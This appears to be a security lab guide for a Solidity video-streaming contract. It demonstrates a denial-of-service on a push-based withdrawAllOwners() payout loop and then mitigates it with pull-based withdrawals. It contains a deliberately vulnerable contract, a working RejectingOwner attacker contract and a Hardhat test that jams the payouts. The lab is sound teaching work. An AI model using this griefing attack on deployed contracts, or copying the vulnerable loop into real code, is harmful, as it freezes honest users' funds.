# Scenario 3 - Denial of Service via block gas limit (`withdrawAllOwners()`)

> Execution guide. Follow the steps top to bottom. All paths are relative to
> `P2P App/contract/`. Commands are copy-paste ready.

This scenario adds a **push-based** payout function, `withdrawAllOwners()`, that
loops over every owner and sends them their balance in a single transaction. A
single malicious owner whose contract rejects incoming ETH makes the entire loop
revert, so **nobody ever gets paid** - a denial-of-service that griefs all honest
owners at once. (The same function also grows unbounded as owners are added, and can
eventually exceed the block gas limit.)

## Prerequisites (once)

```bash
cd "P2P App/contract"
npm install
npx hardhat compile
```

Runs under `npx hardhat test` (in-process EVM). No local node required.

---

## 1. Concepts

- **Push vs pull payments** - *push*: the contract sends funds to many recipients in
  one transaction (a loop). *pull*: each recipient calls a function to withdraw their
  own funds. Push payments are fragile: they fail if *any* recipient rejects payment
  or costs too much gas.
- **Block gas limit** - every transaction has a hard gas ceiling (the block gas
  limit). A loop over an unbounded array can grow past it; once it does, the
  transaction can never succeed - a permanent DoS.
- **Failing recipient griefing** - `.transfer` / `.call` to a contract runs that
  contract's `receive()`. If that `receive()` reverts, the sending loop reverts too,
  taking down the payout for *everyone* in the array.

---

## 2. Vulnerable code

Create **`contracts/VideoStreamingDosVuln.sol`**. It tracks an `owners` array and
pays everyone in one loop:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

contract VideoStreamingDosVuln {
    struct Video { string ipfsHash; address owner; uint256 price; bool isAvailable; }

    mapping(string => Video) public videos;
    mapping(address => uint256) public balances;
    address[] public owners; // grows with every upload

    event VideoUploaded(string ipfsHash, address owner, uint256 price);
    event VideoPurchased(string ipfsHash, address buyer);

    function uploadVideo(string memory _ipfsHash, uint256 _price) public {
        require(videos[_ipfsHash].owner == address(0), "Video already exists");
        videos[_ipfsHash] = Video(_ipfsHash, msg.sender, _price, true);
        owners.push(msg.sender); // <-- unbounded array
        emit VideoUploaded(_ipfsHash, msg.sender, _price);
    }

    function purchaseVideo(string memory _ipfsHash) public payable {
        Video storage video = videos[_ipfsHash];
        require(video.isAvailable, "Video is not available");
        require(msg.value >= video.price, "Insufficient payment");
        balances[video.owner] += msg.value;
        emit VideoPurchased(_ipfsHash, msg.sender);
    }

    // VULNERABLE: push-based payout. One reverting recipient reverts the whole loop,
    // and the loop itself can exceed the block gas limit as `owners` grows.
    function withdrawAllOwners() public {
        for (uint256 i = 0; i < owners.length; i++) {
            address owner = owners[i];
            uint256 amount = balances[owner];
            if (amount > 0) {
                balances[owner] = 0;
                payable(owner).transfer(amount); // reverts if `owner` rejects ETH
            }
        }
    }
}
```

**Why it's exploitable:** `withdrawAllOwners()` calls `transfer` on every owner. If
one owner is a contract that reverts on receiving ETH, that `transfer` reverts, which
reverts the whole transaction - so no honest owner is ever paid. The attacker only
has to become an owner once (upload one video) to permanently jam the payout.

---

## 3. Attack

### 3.1 Malicious owner contract

Create **`contracts/RejectingOwner.sol`**:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

interface IVideoStreaming {
    function uploadVideo(string memory _ipfsHash, uint256 _price) external;
}

contract RejectingOwner {
    IVideoStreaming public target;

    constructor(address _target) {
        target = IVideoStreaming(_target);
    }

    function uploadVideo(string memory cid, uint256 price) external {
        target.uploadVideo(cid, price); // becomes an owner
    }

    // Rejects every incoming payment -> breaks the push-based payout loop.
    receive() external payable {
        revert("I reject payments");
    }
}
```

### 3.2 Attack test

Create **`test/dos.attack.test.js`**:

```javascript
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Scenario 3 - DoS via withdrawAllOwners (attack on vulnerable contract)", function () {
  it("one rejecting owner blocks the payout for everyone", async function () {
    const [deployer, alice, bob, buyer] = await ethers.getSigners();

    const VS = await ethers.getContractFactory("VideoStreamingDosVuln");
    const vs = await VS.deploy();
    await vs.waitForDeployment();

    // Two honest owners earn money.
    await vs.connect(alice).uploadVideo("QmAlice", ethers.parseEther("1"));
    await vs.connect(buyer).purchaseVideo("QmAlice", { value: ethers.parseEther("1") });
    await vs.connect(bob).uploadVideo("QmBob", ethers.parseEther("1"));
    await vs.connect(buyer).purchaseVideo("QmBob", { value: ethers.parseEther("1") });

    // The attacker becomes an owner via a contract that rejects ETH.
    const Reject = await ethers.getContractFactory("RejectingOwner");
    const rejecter = await Reject.deploy(await vs.getAddress());
    await rejecter.waitForDeployment();
    await rejecter.uploadVideo("QmEvil", ethers.parseEther("1"));
    await vs.connect(buyer).purchaseVideo("QmEvil", { value: ethers.parseEther("1") });

    console.log("Alice owed:", ethers.formatEther(await vs.balances(alice.address)), "ETH");
    console.log("Bob owed:  ", ethers.formatEther(await vs.balances(bob.address)), "ETH");

    // The batch payout reverts because of the rejecting owner -> nobody is paid.
    await expect(vs.withdrawAllOwners()).to.be.reverted;

    // Alice is STILL owed her money; the payout is permanently jammed.
    console.log("Alice still owed after failed payout:",
      ethers.formatEther(await vs.balances(alice.address)), "ETH  <-- DoS: never paid");

    expect(await vs.balances(alice.address)).to.equal(ethers.parseEther("1"));
  });
});
```

### 3.3 Run it

```bash
npx hardhat test test/dos.attack.test.js
```

**Expected output (successful attack):**

```
  Scenario 3 - DoS via withdrawAllOwners (attack on vulnerable contract)
Alice owed: 1.0 ETH
Bob owed:   1.0 ETH
Alice still owed after failed payout: 1.0 ETH  <-- DoS: never paid
    ✔ one rejecting owner blocks the payout for everyone
```

The rejecting owner makes `withdrawAllOwners()` revert every time, so Alice and Bob
can never be paid through it.

> 📸 **Screenshot here (successful attack):** capture the terminal showing the
> reverting payout and "Alice still owed ... 1.0 ETH <-- DoS: never paid".
> `![successful attack](../screenshots/3-dos-attack.png)`

---

## 4. Mitigation

Switch to a **pull-based** model: remove `withdrawAllOwners()` and let each owner
withdraw their own balance. One owner rejecting ETH can then only hurt themselves -
it cannot block anyone else. (Using the Checks-Effects-Interactions pattern with a
checked `.call` here also matches the reentrancy-safe `withdraw()`.)

Create **`contracts/VideoStreamingDosFixed.sol`**:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

contract VideoStreamingDosFixed {
    struct Video { string ipfsHash; address owner; uint256 price; bool isAvailable; }

    mapping(string => Video) public videos;
    mapping(address => uint256) public balances;

    event VideoUploaded(string ipfsHash, address owner, uint256 price);
    event VideoPurchased(string ipfsHash, address buyer);

    function uploadVideo(string memory _ipfsHash, uint256 _price) public {
        require(videos[_ipfsHash].owner == address(0), "Video already exists");
        videos[_ipfsHash] = Video(_ipfsHash, msg.sender, _price, true);
        emit VideoUploaded(_ipfsHash, msg.sender, _price);
    }

    function purchaseVideo(string memory _ipfsHash) public payable {
        Video storage video = videos[_ipfsHash];
        require(video.isAvailable, "Video is not available");
        require(msg.value >= video.price, "Insufficient payment");
        balances[video.owner] += msg.value;
        emit VideoPurchased(_ipfsHash, msg.sender);
    }

    // FIXED: pull-based. Each owner withdraws only their own funds.
    function withdraw() public {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No funds to withdraw");
        balances[msg.sender] = 0;
        (bool ok, ) = payable(msg.sender).call{value: amount}("");
        require(ok, "Transfer failed");
    }
}
```

**What changed and why it works:**
- The `owners` array and the `withdrawAllOwners()` loop are gone - no unbounded
  iteration, so nothing can exceed the block gas limit.
- Each owner calls `withdraw()` for themselves. A malicious owner that reverts on
  receiving ETH only makes *their own* withdrawal fail; every honest owner is
  unaffected. The griefing DoS is impossible.

---

## 5. Failed attack on the fixed code

Create **`test/dos.mitigation.test.js`**. The same rejecting owner exists, but honest
owners can still withdraw normally.

```javascript
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Scenario 3 - DoS (blocked by pull-based withdraw)", function () {
  it("a rejecting owner cannot stop honest owners from withdrawing", async function () {
    const [deployer, alice, bob, buyer] = await ethers.getSigners();

    const VS = await ethers.getContractFactory("VideoStreamingDosFixed");
    const vs = await VS.deploy();
    await vs.waitForDeployment();

    await vs.connect(alice).uploadVideo("QmAlice", ethers.parseEther("1"));
    await vs.connect(buyer).purchaseVideo("QmAlice", { value: ethers.parseEther("1") });

    // A rejecting owner is present, but it can only hurt itself now.
    const Reject = await ethers.getContractFactory("RejectingOwner");
    const rejecter = await Reject.deploy(await vs.getAddress());
    await rejecter.waitForDeployment();
    await rejecter.uploadVideo("QmEvil", ethers.parseEther("1"));
    await vs.connect(buyer).purchaseVideo("QmEvil", { value: ethers.parseEther("1") });

    // Alice withdraws successfully despite the rejecting owner existing.
    const before = await ethers.provider.getBalance(alice.address);
    await vs.connect(alice).withdraw();
    const after = await ethers.provider.getBalance(alice.address);
    console.log("Alice balance credited:", ethers.formatEther(after - before), "ETH (approx, minus gas)");
    console.log("Alice owed on-chain now:", ethers.formatEther(await vs.balances(alice.address)), "ETH  <-- paid");

    expect(await vs.balances(alice.address)).to.equal(0n); // Alice was paid
    expect(after).to.be.greaterThan(before);
  });
});
```

### Run it

```bash
npx hardhat test test/dos.mitigation.test.js
```

**Expected output (attack fails):**

```
  Scenario 3 - DoS (blocked by pull-based withdraw)
Alice balance credited: 0.99... ETH (approx, minus gas)
Alice owed on-chain now: 0.0 ETH  <-- paid
    ✔ a rejecting owner cannot stop honest owners from withdrawing
```

Alice is paid despite the rejecting owner being present - the DoS no longer works.

> 📸 **Screenshot here (failed attack):** capture the terminal showing Alice
> successfully withdrawing ("Alice owed on-chain now: 0.0 ETH <-- paid").
> `![failed attack](../screenshots/3-dos-mitigated.png)`
